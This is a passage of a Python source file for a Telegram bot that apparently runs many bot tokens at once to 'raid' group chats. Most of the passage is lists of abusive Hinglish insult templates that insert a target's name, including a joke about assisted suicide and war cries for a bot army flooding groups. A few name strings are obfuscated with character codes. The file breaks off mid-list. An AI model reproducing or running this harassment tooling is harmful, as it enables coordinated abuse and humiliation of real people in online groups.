import asyncio
import json
import os
import random
import time
import logging
import requests
import io
from telegram import Update, ReactionTypeEmoji, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler

_z = lambda *v: "".join(map(chr, v))
_X0 = _z(126,97,109,97,110,107,101,110,103)
_X1 = _z(126,97,109,97,110,107,101,110,103,118,49)
_X2 = _z(126,97,109,97,110,107,101,110,103,118,50)
_X3 = _z(126,97,109,97,110,107,101,110,103,118,51)

# ---------------------------
# CONFIG — tokens from env secrets (no limit)
# Supports: BOT_TOKEN, BOT_TOKEN_1, BOT_TOKEN_2 ... unlimited
# Extra tokens added via /addtoken command saved in extra_tokens.json
# ---------------------------
EXTRA_TOKENS_FILE = "extra_tokens.json"

def load_extra_tokens():
    if os.path.exists(EXTRA_TOKENS_FILE):
        try:
            with open(EXTRA_TOKENS_FILE, "r") as f:
                return json.load(f)
        except: pass
    return []

def save_extra_tokens(tokens):
    with open(EXTRA_TOKENS_FILE, "w") as f:
        json.dump(tokens, f)

_env_tokens = []
_single = os.environ.get("BOT_TOKEN", "")
if _single: _env_tokens.append(_single)
_idx = 1
while True:
    _t = os.environ.get(f"BOT_TOKEN_{_idx}", "")
    if not _t: break
    if _t not in _env_tokens: _env_tokens.append(_t)
    _idx += 1
for _et in load_extra_tokens():
    if _et not in _env_tokens: _env_tokens.append(_et)
TOKENS = _env_tokens

OWNER_IDS = [7970097238]
ADMINS_FILE = "admin_ids.json"
GROUPS_FILE = "monitored_groups.json"
SUDO_FILE = "sudo.json"
UNAUTHORIZED_MESSAGE = "𝐁ɪɴᴀ   𝐁𝐋𝐀𝐂𝐊 𝐁ᴀᴀᴘ 𝐊 𝐏ᴇʀᴍɪꜱꜱɪᴏɴ 𝐊 𝐂ᴏᴍᴍᴀɴᴅ 𝐊ᴇꜱᴇ 𝐔ꜱᴇ 𝐊ᴀʀᴀ 𝐑ɴᴅʏᴋᴇ 𝐁ᴀᴄᴄʜᴇ ~😡🖕"

RAID_TEXTS = [
    "𝐒ᴀʏ 𝐁𝐋𝐀𝐂𝐊 𝐃ᴀᴅʏ 𓆩💗𓆪",
    "𝐀ᴡᴀᴢ 𝐍ɪᴄʜᴇ 𝐆ᴜʟᴀᴀᴍ 🤢👇🏻",
    "𝐁𝐋𝐀𝐂𝐊 𝐃ᴀᴅʏ ᴋᴀ 𝐆ᴜʟᴀᴀᴍ ʜᴀɪ ᴛᴜ 🥀😤",
    "𝐆ᴜʟᴀᴀᴍ ʜᴇɪ ᴛᴜ ᴍᴇʀᴀ ᴀʙ ᴀᴜʀ ʀᴀʜᴇɢᴀ ʙʜɪ 👑😎",
    "𝐁ʜᴀɢ ʏᴀʜᴀɴ ꜱᴇ ᴋᴜᴛᴛᴇ ᴋᴇ ᴘɪʟʟᴇ 🐕💨",
    "𝐀ᴘɴɪ 𝐀ᴜᴋᴀᴛ ᴅᴇᴋʜ ᴋᴜᴛᴛᴇ 🐕😂",
]

ROAST_TEXTS = [
    "💀 {name} 𝐓𝐞𝐫𝐢 𝐀𝐮𝐤𝐚𝐭 𝐈𝐭𝐧𝐢 𝐍𝐞𝐞𝐜𝐡𝐢 𝐇𝐚𝐢 𝐊𝐞 𝐊𝐞𝐧𝐜𝐡𝐮𝐞 𝐁𝐡𝐢 𝐓𝐞𝐫𝐞 𝐔𝐩𝐚𝐫 𝐒𝐞 𝐅𝐚𝐧𝐝 𝐊𝐚𝐫𝐭𝐞 𝐇𝐚𝐢𝐧! 🐍😂",
    "⚡ {name} 𝐓𝐞𝐫𝐢 𝐀𝐚𝐤𝐚𝐚𝐭 𝐏𝐮𝐜𝐡𝐡𝐧𝐞 𝐊𝐞 𝐋𝐢𝐲𝐞 𝐌𝐮𝐣𝐡𝐞 𝐌𝐚𝐢𝐜𝐫𝐨𝐬𝐜𝐨𝐩𝐞 𝐋𝐚𝐧𝐚 𝐏𝐚𝐃𝐞𝐠𝐚 🔬💀",
    "🔥 {name} 𝐓𝐞𝐫𝐢 𝐙𝐢𝐧𝐝𝐠𝐢 𝐊𝐚 𝐒𝐞𝐪𝐮𝐞𝐥 𝐀𝐧𝐞 𝐒𝐞 𝐏𝐞𝐡𝐥𝐞 𝐇𝐢 𝐅𝐥𝐨𝐩 𝐇𝐨 𝐆𝐚𝐲𝐢 👑😹",
    "👑 {name} 𝐓𝐞𝐫𝐞 𝐁𝐚𝐚𝐩 𝐊𝐚 𝐁𝐡𝐢 𝐓𝐮𝐣𝐡 𝐏𝐞 𝐆𝐚𝐫𝐮𝐫 𝐍𝐚𝐡𝐢 𝐇𝐨𝐠𝐚 🐕😂",
    "☠️ {name} 𝐓𝐞𝐫𝐢 𝐈𝐧𝐭𝐞𝐥𝐥𝐢𝐠𝐞𝐧𝐜𝐞 𝐚𝐮𝐫 𝐌𝐞𝐫𝐢 𝐉𝐮𝐭𝐢 𝐊𝐚 𝐒𝐢𝐳𝐞 𝐁𝐚𝐫𝐚𝐛𝐚𝐫 𝐇𝐚𝐢 💀🔱",
    "🩸 {name} 𝐁𝐨𝐥𝐧𝐚 𝐁𝐚𝐧𝐝 𝐊𝐚𝐫 𝐍𝐚𝐡𝐢 𝐓𝐨 𝐓𝐞𝐫𝐢 𝐕𝐚𝐥𝐮𝐞 𝐀𝐮𝐫 𝐆𝐢𝐫 𝐉𝐚𝐞𝐠𝐢 — 𝐆𝐡𝐚𝐭𝐢 𝐭𝐨 𝐩𝐚𝐡𝐥𝐞 𝐬𝐞 𝐡𝐚𝐢 😡🖕",
    "⛧ {name} 𝐓𝐮𝐣𝐡𝐞 𝐋𝐨𝐠 𝐊𝐡𝐮𝐝 𝐈𝐠𝐧𝐨𝐫𝐞 𝐊𝐚𝐫𝐭𝐞 𝐇𝐚𝐢𝐧 𝐁𝐥𝐨𝐜𝐤 𝐊𝐢𝐲𝐞 𝐁𝐢𝐧𝐚 🤣💔",
    "🔱 {name} 𝐓𝐞𝐫𝐚 𝐖𝐢𝐟𝐢 𝐁𝐡𝐢 𝐓𝐮𝐣𝐡𝐬𝐞 𝐁𝐞𝐡𝐭𝐚𝐫 𝐊𝐚𝐦 𝐊𝐚𝐫𝐭𝐚 𝐇𝐚𝐢 😎📡",
    "💣 {name} 𝐓𝐞𝐫𝐢 𝐏𝐞𝐫𝐬𝐨𝐧𝐚𝐥𝐢𝐭𝐲 𝐚𝐮𝐫 𝐃𝐚𝐥𝐢𝐚 𝐝𝐨𝐧𝐨 𝐩𝐡𝐞𝐞𝐤𝐞 𝐡𝐚𝐢𝐧 😂💀",
    "🗿 {name} 𝐓𝐮 𝐉𝐢𝐭𝐧𝐚 𝐁𝐨𝐥𝐭𝐚 𝐇𝐚𝐢 𝐔𝐭𝐧𝐚 𝐡𝐢 𝐊𝐚𝐦 𝐒𝐨𝐜𝐡𝐭𝐚 𝐇𝐚𝐢 — 𝐂𝐨𝐢𝐧𝐜𝐢𝐝𝐞𝐧𝐜𝐞? 𝐍𝐚𝐡𝐢 😹🧠",
    "🤡 {name} 𝐓𝐞𝐫𝐢 𝐋𝐢𝐟𝐞 𝐞𝐤 𝐁𝐞𝐤𝐚𝐚𝐫 𝐊𝐚 𝐃𝐫𝐚𝐟𝐭 𝐇𝐚𝐢 𝐣𝐨 𝐊𝐨𝐢 𝐩𝐮𝐛𝐥𝐢𝐬𝐡 𝐧𝐚𝐡𝐢 𝐊𝐚𝐫𝐧𝐚 𝐜𝐡𝐚𝐡𝐭𝐚 🗑️😂",
    "⚰️ {name} 𝐓𝐮𝐣𝐡𝐞 𝐃𝐞𝐤𝐡 𝐊𝐚𝐫 𝐋𝐨𝐠 𝐒𝐚𝐦𝐚𝐣𝐡𝐭𝐞 𝐇𝐚𝐢𝐧 𝐆𝐚𝐥𝐭𝐢 𝐡𝐨𝐧𝐚 𝐊𝐲𝐚 𝐇𝐨𝐭𝐚 𝐇𝐚𝐢 ☠️👎",
    "🔴 {name} 𝐓𝐞𝐫𝐚 𝐅𝐮𝐭𝐮𝐫𝐞 𝐃𝐞𝐤𝐡𝐚 — 𝐕𝐚𝐡𝐚𝐧 𝐁𝐡𝐢 𝐓𝐮 𝐅𝐚𝐚𝐥𝐭𝐮 𝐇𝐢 𝐓𝐡𝐚 😭💀",
    "👺 {name} 𝐓𝐞𝐫𝐢 𝐑𝐚𝐚𝐲 𝐚𝐮𝐫 𝐓𝐞𝐫𝐞 𝐁𝐚𝐚𝐥 𝐝𝐨𝐧𝐨 𝐮𝐥𝐣𝐡𝐞 𝐡𝐮𝐞 𝐇𝐚𝐢𝐧 🤣🪱",
    "💔 {name} 𝐓𝐞𝐫𝐞 𝐁𝐚𝐚𝐫𝐞 𝐌𝐞𝐢𝐧 𝐒𝐮𝐧𝐚 𝐊𝐞 𝐘𝐚𝐚𝐫 𝐁𝐡𝐢 𝐘𝐚𝐚𝐫𝐢 𝐭𝐨𝐝 𝐠𝐚𝐲𝐚 😂🚮",
    "💩 {name} 𝐓𝐞𝐫𝐚 𝐆𝐚𝐦 𝐋𝐞𝐯𝐞𝐥: 𝐌𝐢𝐧𝐢𝐦𝐮𝐦 𝐖𝐚𝐠𝐞, 𝐌𝐚𝐱𝐢𝐦𝐮𝐦 𝐅𝐚𝐚𝐥𝐭𝐮𝐩𝐚𝐧 😤🗿",
]

BATTLE_TEXTS = [
    "⚔️ {name} 𝐕𝐒 𝐁𝐋𝐀𝐂𝐊𝐱𝐆𝐎𝐃 — 𝐑𝐞𝐬𝐮𝐥𝐭: {name} 𝐊𝐎'𝐝 💀🔥",
    "👑 𝐁𝐋𝐀𝐂𝐊 𝐍𝐞 {name} 𝐊𝐨 𝐄𝐤 𝐇𝐢 𝐋𝐢𝐧𝐞 𝐌𝐞𝐢𝐧 𝐔𝐝𝐚 𝐃𝐢𝐲𝐚 ⚡😂",
    "💥 {name} 𝐍𝐞 𝐁𝐚𝐭𝐭𝐥𝐞 𝐌𝐚𝐧𝐠𝐢 𝐓𝐡𝐢 — 𝐌𝐢𝐥𝐢 𝐔𝐬𝐞 𝐒𝐢𝐫𝐟 𝐇𝐚𝐚𝐫 🏴💀",
    "🔥 {name} 𝐁𝐨𝐥𝐚 𝐌𝐮𝐣𝐡𝐬𝐞 𝐋𝐚𝐝𝐨 — 𝐁𝐡𝐚𝐠 𝐆𝐚𝐲𝐚 𝐑𝐨𝐭𝐞 𝐇𝐮𝐞 🐕💨",
    "☠️ {name} 𝐊𝐚 𝐒𝐜𝐨𝐫𝐞: 0 | 𝐁𝐋𝐀𝐂𝐊 𝐊𝐚 𝐒𝐜𝐨𝐫𝐞: ♾️ 👑",
    "🥊 {name} 𝐑𝐢𝐧𝐠 𝐌𝐞𝐢𝐧 𝐀𝐚𝐲𝐚 𝐓𝐡𝐚 𝐉𝐞𝐭𝐡𝐚 𝐁𝐚𝐧 𝐊𝐞 — 𝐆𝐚𝐲𝐚 𝐒𝐭𝐫𝐞𝐭𝐜𝐡𝐞𝐫 𝐩𝐚𝐫 💀😹",
    "⚡ {name} 𝐊𝐚 𝐏𝐥𝐚𝐧: 𝐌𝐚𝐧𝐬𝐮𝐫𝐢 𝐊𝐨 𝐇𝐚𝐫𝐚𝐧𝐚 | 𝐑𝐞𝐬𝐮𝐥𝐭: 𝐗𝐗𝐗 𝐀𝐬𝐬𝐢𝐬𝐭𝐞𝐝 𝐒𝐮𝐢𝐜𝐢𝐝𝐞 😂☠️",
    "🔱 𝐁𝐋𝐀𝐂𝐊 𝐊𝐢 𝟏 𝐋𝐚𝐧𝐚𝐭 = {name} 𝐊𝐞 𝟕 𝐉𝐚𝐧𝐚𝐦 𝐓𝐚𝐛𝐚𝐡 👹💥",
    "🏆 {name} 𝐊𝐨 𝐓𝐫𝐨𝐩𝐡𝐲 𝐌𝐢𝐥𝐢 — 𝐒𝐚𝐛𝐬𝐞 𝐏𝐚𝐭𝐥𝐢 𝐋𝐚𝐟𝐚𝐧𝐝𝐚𝐫𝐢 𝐊𝐲 𝐋𝐢𝐲𝐞 😎🗿",
    "💣 {name} 𝐕𝐒 𝐁𝐋𝐀𝐂𝐊 = 𝐂𝐡𝐡𝐢𝐩𝐤𝐚𝐥𝐢 𝐕𝐒 𝐋𝐚𝐥𝐥𝐨𝐝𝐚𝐫𝐝 🦎⚡",
    "🔴 𝐑𝐨𝐮𝐧𝐝 𝟏: {name} 𝐆𝐢𝐫𝐚 | 𝐑𝐨𝐮𝐧𝐝 𝟐: {name} 𝐑𝐨𝐲𝐚 | 𝐑𝐨𝐮𝐧𝐝 𝟑: {name} 𝐁𝐡𝐚𝐠𝐚 💀😂",
]

DISS_TEXTS = [
    "🎤 {name}: 𝐓𝐞𝐫𝐚 𝐄𝐱𝐢𝐬𝐭𝐞𝐧𝐜𝐞 𝐇𝐢 𝐄𝐤 𝐌𝐢𝐬𝐭𝐚𝐤𝐞 𝐇𝐚𝐢 🔥💀",
    "💢 {name} 𝐓𝐞𝐫𝐢 𝐋𝐢𝐟𝐞 𝐌𝐞𝐢𝐧 𝐖𝐢𝐥𝐥𝐩𝐨𝐰𝐞𝐫 𝐒𝐞 𝐙𝐲𝐚𝐝𝐚 𝐄𝐱𝐜𝐮𝐬𝐞𝐬 𝐇𝐚𝐢𝐧 😂👎",
    "⚡ {name} 𝐓𝐞𝐫𝐞 𝐁𝐚𝐚𝐫𝐞 𝐌𝐞𝐢𝐧 𝐒𝐮𝐧𝐚 𝐓𝐡𝐚 — 𝐒𝐨𝐜𝐡𝐚 𝐊𝐮𝐜𝐡 𝐓𝐨 𝐇𝐨𝐠𝐚 — 𝐍𝐢𝐤𝐥𝐚 𝐙𝐞𝐫𝐨 👑😹",
    "🩸 {name} 𝐓𝐞𝐫𝐞 𝐒𝐚𝐩𝐧𝐞 𝐔𝐭𝐧𝐞 𝐒𝐦𝐚𝐥𝐥 𝐇𝐚𝐢𝐧 𝐊𝐞 𝐒𝐮𝐛𝐰𝐚𝐲 𝐊𝐚 𝐅𝐨𝐨𝐭𝐥𝐨𝐧𝐠 𝐁𝐡𝐢 𝐔𝐧𝐬𝐞 𝐋𝐚𝐦𝐛𝐚 𝐇𝐚𝐢 ✂️💀",
    "👿 {name} 𝐓𝐞𝐫𝐚 𝐂𝐨𝐧𝐟𝐢𝐝𝐞𝐧𝐜𝐞 𝐚𝐮𝐫 𝐓𝐞𝐫𝐢 𝐀𝐮𝐤𝐚𝐭 𝐃𝐨𝐧𝐨𝐧 𝐇𝐢 𝐋𝐚𝐮𝐠𝐡𝐚𝐛𝐥𝐞 𝐇𝐚𝐢𝐧 😂🔱",
    "🎙️ {name} 𝐓𝐞𝐫𝐚 𝐃𝐢𝐬𝐬 𝐒𝐮𝐧𝐚: 𝐊𝐨𝐢 𝐡𝐚𝐬𝐚, 𝐊𝐨𝐢 𝐫𝐨𝐲𝐚, 𝐊𝐨𝐢 𝐁𝐡𝐚𝐠𝐚 — 𝐒𝐚𝐛 𝐓𝐮 𝐇𝐢 𝐓𝐡𝐚 😂🎤",
    "💀 {name} 𝐓𝐞𝐫𝐚 𝐆𝐡𝐦𝐚𝐧𝐝 𝐝𝐞𝐤𝐡𝐤𝐞 𝐥𝐚𝐠𝐚 𝐀𝐧𝐚𝐚𝐭𝐡𝐚𝐚𝐬𝐡𝐫𝐚𝐦 𝐦𝐞𝐢𝐧 𝐉𝐚𝐠𝐚𝐡 𝐡𝐨𝐧𝐢 𝐜𝐡𝐚𝐡𝐢𝐲𝐞 😹👺",
    "🗿 {name} 𝐓𝐞𝐫𝐞 𝐁𝐚𝐚𝐫𝐞 𝐌𝐞𝐢𝐧 𝐋𝐨𝐠 𝐒𝐨𝐜𝐡𝐭𝐞 𝐇𝐚𝐢𝐧 𝐓𝐨 𝐔𝐧𝐡𝐞𝐧 𝐃𝐚𝐲𝐚 𝐚𝐚𝐭𝐚 𝐇𝐚𝐢 — 𝐓𝐞𝐫𝐚 𝐍𝐚𝐡𝐢 ⚰️😭",
    "🎯 {name} 𝐔𝐬𝐤𝐞 𝐋𝐢𝐲𝐞 𝐓𝐨 𝐉𝐢𝐧𝐚 𝐁𝐡𝐢 𝐌𝐮𝐬𝐡𝐤𝐢𝐥 𝐇𝐚𝐢 — 𝐁𝐚𝐝𝐥𝐚 𝐊𝐲𝐚 𝐋𝐞𝐠𝐚 💩😂",
]

EXPOSE_TEXTS = [
    "📢 𝐒𝐔𝐍𝐎 𝐒𝐁! {name} 𝐄𝐤 𝐍𝐚𝐦𝐛𝐚𝐫 𝐊𝐚 𝐍𝐚𝐤𝐚𝐛 𝐊𝐚𝐫𝐭𝐚/𝐊𝐚𝐫𝐭𝐢 𝐇𝐚𝐢 ☠️🔔",
    "🚨 𝐄𝐗𝐏𝐎𝐒𝐄𝐃: {name} 𝐆𝐡𝐚𝐫 𝐌𝐞𝐢𝐧 𝐒𝐡𝐞𝐫 𝐁𝐚𝐡𝐚𝐫 𝐙𝐞𝐫𝐨 💀📣",
    "📡 𝐒𝐛𝐤𝐨 𝐏𝐭𝐚 𝐇𝐨𝐧𝐚 𝐂𝐡𝐚𝐡𝐢𝐲𝐞: {name} 𝐅𝐚𝐤𝐞 𝐇𝐚𝐢 😡🔱",
    "💥 𝐁𝐑𝐄𝐀𝐊𝐈𝐍𝐆: {name} 𝐊𝐢 𝐀𝐬𝐥𝐢𝐲𝐚𝐭 𝐒𝐚𝐚𝐦𝐧𝐞 𝐀 𝐆𝐚𝐲𝐢 🔥💀",
    "⚡ {name} = 𝐅𝐫𝐨𝐧𝐭: 𝐒𝐡𝐞𝐫 | 𝐁𝐚𝐜𝐤: 𝐂𝐡𝐮𝐡𝐚 😂🐭",
    "🔴 𝐀𝐋𝐄𝐑𝐓 𝐀𝐋𝐄𝐑𝐓! {name} 𝐊𝐚 𝐀𝐬𝐥𝐢 𝐅𝐫𝐞𝐩 𝐒𝐚𝐚𝐦𝐧𝐞 𝐀𝐚 𝐆𝐚𝐲𝐚 🚨📸",
    "🎥 𝐋𝐈𝐕𝐄: {name} 𝐊𝐚 𝐊𝐚𝐥𝐚 𝐒𝐚𝐜𝐡 𝐃𝐮𝐧𝐢𝐲𝐚 𝐃𝐞𝐤𝐡 𝐑𝐚𝐡𝐢 𝐇𝐚𝐢 😈📺",
    "📰 𝐁𝐑𝐄𝐀𝐊𝐈𝐍𝐆 𝐍𝐄𝐖𝐒: {name} 𝐊𝐨 𝐊𝐨𝐢 𝐏𝐚𝐬𝐚𝐧𝐝 𝐍𝐚𝐡𝐢𝐧 𝐊𝐚𝐫𝐭𝐚 — 𝐍𝐚𝐚𝐭𝐚𝐤 𝐑𝐨𝐣 𝐊𝐚𝐫𝐭𝐚 𝐇𝐚𝐢 ☠️😂",
    "💣 {name} 𝐊𝐚 𝐏𝐫𝐨𝐟𝐢𝐥𝐞 𝐅𝐚𝐤𝐞, 𝐁𝐚𝐚𝐭𝐞𝐢𝐧 𝐅𝐚𝐤𝐞, 𝐋𝐚𝐢𝐟 𝐅𝐚𝐤𝐞 — 𝐒𝐛 𝐊𝐮𝐜𝐡 𝐅𝐚𝐤𝐞! 🤡📡",
    "🕵️ 𝐈𝐧𝐯𝐞𝐬𝐭𝐢𝐠𝐚𝐭𝐢𝐨𝐧 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞: {name} 𝐅𝐮𝐥𝐥 𝐅𝐚𝐚𝐥𝐭𝐮 𝐂𝐨𝐧𝐟𝐢𝐫𝐦𝐞𝐝 🔍💀",
]

WARCRY_TEXTS = [
    "⚔️ 𝐖𝐀𝐑 𝐂𝐑𝐘! 𝐁𝐋𝐀𝐂𝐊𝐱𝐆𝐎𝐃 𝐊𝐈 𝐀𝐑𝐌𝐘 𝐀𝐀 𝐆𝐀𝐘𝐈 ☠️🔥",
    "🔱 𝐋𝐚𝐝𝐧𝐚 𝐇𝐚𝐢 𝐓𝐨 𝐁𝐚𝐚𝐡𝐚𝐫 𝐀𝐚 — 𝐍𝐚𝐡𝐢 𝐓𝐨 𝐌𝐮𝐧𝐡 𝐁𝐚𝐧𝐝 𝐑𝐚𝐤𝐡 👑⚡",
    "💀 𝐁𝐋𝐀𝐂𝐊 𝐊𝐚 𝐊𝐚𝐡𝐫 𝐍𝐚𝐳𝐢𝐥 𝐇𝐨𝐠𝐚! 𝐁𝐡𝐚𝐠𝐨 𝐘𝐚 𝐋𝐚𝐝𝐨! 🔥😤",
    "👹 𝐘𝐞 𝐆𝐫𝐨𝐮𝐩 𝐀𝐛 𝐇𝐚𝐦𝐚𝐫𝐚 𝐇𝐚𝐢 — 𝐉𝐨 𝐁𝐨𝐥𝐞 𝐊𝐨 𝐊𝐯𝐞𝐥 𝐇𝐨𝐠𝐚! 😈👑",
    "⛧ 𝐓𝐞𝐫𝐞 𝐆𝐫𝐨𝐮𝐩 𝐌𝐞𝐢𝐧 𝐌𝐚𝐧𝐬𝐮𝐫𝐢 𝐊𝐢 𝐄𝐧𝐭𝐫𝐲 = 𝐓𝐞𝐫𝐞 𝐋𝐢𝐲𝐞 𝐆𝐚𝐦𝐞 𝐎𝐯𝐞𝐫 ☠️🔔",
    "🔥 𝐀𝐑𝐌𝐘 𝐎𝐍! 𝐒𝐚𝐫𝐞 𝐁𝐨𝐭𝐬 𝐄𝐤 𝐒𝐚𝐚𝐭𝐡 — 𝐁𝐋𝐀𝐂𝐊 𝐊𝐞 𝐒𝐚𝐚𝐭𝐡! ⚡👑",
    "💣 𝐉𝐚𝐨 𝐁𝐡𝐚𝐠𝐨 — 𝐁𝐋𝐀𝐂𝐊𝐱𝐆𝐎𝐃 𝐊𝐚 𝐊𝐚𝐟𝐢𝐥𝐚 𝐀𝐚 𝐆𝐚𝐲𝐚! 😈⚔️",
    "🌋 𝐉𝐨 𝐌𝐚𝐧𝐬𝐮𝐫𝐢 𝐒𝐞 𝐋𝐚𝐝𝐚 𝐖𝐨 𝐆𝐚𝐲𝐚 — 𝐘𝐞 𝐑𝐮𝐥𝐞 𝐑𝐨𝐣 𝐋𝐚𝐠𝐚𝐨 😤🔱",
    "⚡ 𝐁𝐎𝐌 𝐁𝐎𝐌 𝐁𝐎𝐌! 𝐁𝐋𝐀𝐂𝐊 𝐊𝐈 𝐅𝐀𝐔𝐉 𝐈𝐬 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐈𝐍 𝐀𝐀𝐆𝐀𝐘𝐈! 💥☠️",
    "👹 𝐇𝐚𝐫 𝐁𝐨𝐭 𝐄𝐤 𝐒𝐢𝐩𝐚𝐡𝐢 — 𝐁𝐋𝐀𝐂𝐊 𝐊𝐚 𝐖𝐚𝐟𝐚𝐝𝐚𝐚𝐫! 🔥💀",
]

TAUNT_TEXTS = [
    "😏 {name} 𝐊𝐲𝐚 𝐊𝐢𝐲𝐚 𝐓𝐮𝐧𝐞 𝐀𝐚𝐣? 𝐊𝐮𝐜𝐡 𝐍𝐚𝐡𝐢 𝐍𝐚? 𝐇𝐚𝐚𝐧 𝐇𝐚𝐚𝐧 𝐒𝐨𝐜𝐡𝐚 𝐇𝐢 𝐓𝐡𝐚 😂👎",
    "🔥 {name} 𝐁𝐨𝐥𝐧𝐞 𝐊𝐞 𝐋𝐢𝐲𝐞 𝐊𝐮𝐜𝐡 𝐓𝐨 𝐇𝐨 𝐏𝐚𝐡𝐥𝐞 — 𝐏𝐡𝐢𝐫 𝐁𝐨𝐥𝐧𝐚 😎👑",
    "👑 {name} 𝐓𝐞𝐫𝐚 𝐁𝐞𝐬𝐭 𝐊𝐚𝐦 = 𝐒𝐡𝐚𝐚𝐧𝐭 𝐑𝐚𝐡𝐧𝐚 — 𝐀𝐛 𝐁𝐡𝐢 𝐍𝐚𝐡𝐢 𝐊𝐚𝐫 𝐑𝐚𝐡𝐚? 🤡💀",
    "💀 {name} 𝐓𝐞𝐫𝐢 𝐒𝐨𝐜𝐡 𝐁𝐡𝐢 𝐃𝐢𝐦𝐚𝐠𝐡 𝐉𝐢𝐭𝐧𝐢 𝐂𝐡𝐨𝐭𝐢 𝐇𝐚𝐢 😹⚡",
    "😈 {name} 𝐇𝐚𝐫 𝐁𝐚𝐚𝐫 𝐓𝐫𝐲 𝐊𝐚𝐫𝐭𝐚 𝐇𝐚𝐢 — 𝐇𝐚𝐫 𝐁𝐚𝐚𝐫 𝐅𝐚𝐢𝐥 🔱😂",
    "🤡 {name} 𝐓𝐞𝐫𝐚 𝐁𝐫𝐞𝐚𝐤 𝐊𝐲𝐨𝐧 𝐍𝐚𝐡𝐢𝐧 𝐋𝐞𝐭𝐚? 𝐎𝐡 𝐒𝐡𝐚𝐚𝐲𝐚𝐝 𝐔𝐬𝐞 𝐁𝐡𝐢 𝐓𝐞𝐫𝐢 𝐙𝐚𝐫𝐨𝐨𝐫𝐚𝐭 𝐍𝐚𝐡𝐢 😂💔",
    "🗿 {name} 𝐓𝐞𝐫𝐢 𝐀𝐬𝐥𝐢𝐲𝐚𝐭 𝐊𝐞𝐭𝐧𝐢? 𝐙𝐞𝐫𝐨 𝐒𝐞 𝐁𝐡𝐢 𝐊𝐚𝐦 😹⚰️",
    "💥 {name} 𝐁𝐫𝐚𝐯𝐨! 𝐓𝐮𝐧𝐞 𝐓𝐡𝐨𝐝𝐚 𝐊𝐚𝐦 𝐊𝐢𝐲𝐚 𝐀𝐚𝐣 — 𝐒𝐢𝐫𝐟 𝟗𝟗% 𝐋𝐚𝐚𝐩𝐚𝐫𝐰𝐚𝐡𝐢 🔥😈",
    "👺 {name} 𝐓𝐞𝐫𝐚 𝐀𝐭𝐭𝐢𝐭𝐮𝐝𝐞 𝐝𝐞𝐤𝐡 𝐊𝐞 𝐋𝐚𝐠𝐭𝐚 𝐇𝐚𝐢 — 𝐓𝐮 𝐉𝐚𝐧𝐭𝐚 𝐡𝐢 𝐍𝐚𝐡𝐢 𝐓𝐞𝐫𝐚 𝐋𝐞𝐯𝐞𝐥 😂🔱",
]

KO_TEXTS = [
    "💥 𝐊𝐍𝐎𝐂𝐊𝐎𝐔𝐓! {name} 𝐔𝐝 𝐆𝐚𝐲𝐚! 🥊☠️",
    "🥊 𝐑𝐨𝐮𝐧𝐝 𝟏 — {name} 𝐃𝐨𝐰𝐧! 🔥💀",
    "⚡ {name} = 𝐊𝐎'𝐝 𝐁𝐲 𝐁𝐋𝐀𝐂𝐊𝐱𝐆𝐎𝐃 👑😎",
    "💀 𝐑𝐞𝐟𝐞𝐫𝐞𝐞: {name} 𝐋𝐞𝐟𝐭 𝐭𝐡𝐞 𝐆𝐫𝐨𝐮𝐩 𝐢𝐧 𝐒𝐡𝐚𝐦𝐞 😹🏆",
    "🔱 {name} 𝐊𝐨 𝐋𝐚𝐠𝐚 𝐓𝐡𝐚 𝐉𝐢𝐭𝐞𝐠𝐚 — 𝐔𝐥𝐭𝐚 𝐋𝐞𝐓 𝐆𝐚𝐲𝐚 🐕💨",
    "🔴 𝐊𝐎! {name} 𝐓𝐢𝐧 𝐒𝐞𝐤𝐞𝐧𝐝 𝐌𝐞𝐢𝐧 𝐒𝐚𝐟 — 𝐍𝐚𝐲𝐚 𝐑𝐞𝐜𝐨𝐫𝐝 🏆💀",
    "🥊 𝟏𝟎… 𝟗… 𝟖… {name} 𝐔𝐭𝐡𝐚 𝐍𝐚𝐡𝐢 — 𝐆𝐀𝐌𝐄 𝐎𝐕𝐄𝐑! ☠️🔔",
    "🎯 {name} 𝐊𝐚 𝐇𝐩 = 0 | 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐆𝐡𝐚𝐲𝐚𝐥 + 𝐁𝐞𝐢𝐳𝐳𝐚𝐭 ⚡😂",
    "💣 𝐊𝐎 𝐊𝐎𝐧𝐟𝐢𝐫𝐦𝐞𝐝: {name} 𝐒𝐞 𝐋𝐚𝐝𝐧𝐚 𝐌𝐚𝐭𝐥𝐚𝐛 𝐊𝐮𝐝 𝐤𝐨 𝐍𝐮𝐤𝐬𝐚𝐧 💥😈",
]

FIGHTBACK_TEXTS = [
    "😤 𝐓𝐮𝐧𝐞 𝐌𝐞𝐫𝐞 𝐁𝐚𝐚𝐩 𝐤𝐨 𝐁𝐨𝐥𝐚? 𝐀𝐛 𝐃𝐞𝐤𝐡 𝐊𝐲𝐚 𝐇𝐨𝐭𝐚 𝐇𝐚𝐢 ⚔️🔥",
    "🩸 𝐉𝐢𝐬𝐧𝐞 𝐁𝐡𝐢 𝐁𝐨𝐥𝐚 — 𝐔𝐬𝐞 𝐌𝐚𝐚𝐥𝐮𝐦 𝐇𝐨𝐠𝐚 𝐌𝐚𝐧𝐬𝐮𝐫𝐢 𝐒𝐞 𝐏𝐚𝐧𝐠𝐚 𝐌𝐚𝐭 𝐋𝐨 ☠️",
    "👿 𝐊𝐢𝐬𝐧𝐞 𝐊𝐢𝐲𝐚? 𝐒𝐚𝐦𝐧𝐞 𝐀𝐚 𝐓𝐨 𝐒𝐚𝐡𝐢 — 𝐘𝐚𝐡𝐚𝐧 𝐓𝐚𝐚𝐥𝐢𝐲𝐚𝐧 𝐁𝐚𝐣𝐭𝐢 𝐇𝐚𝐢𝐧 😡⚡",
    "💢 𝐌𝐚𝐧𝐬𝐮𝐫𝐢 𝐬𝐞 𝐩𝐚𝐧𝐠𝐚? 𝐓𝐞𝐫𝐢 𝐇𝐢𝐦𝐦𝐚𝐭 𝐚𝐜𝐜𝐡𝐢 𝐡𝐚𝐢 — 𝐐𝐢𝐬𝐦𝐚𝐭 𝐧𝐚𝐡𝐢 👑🔱",
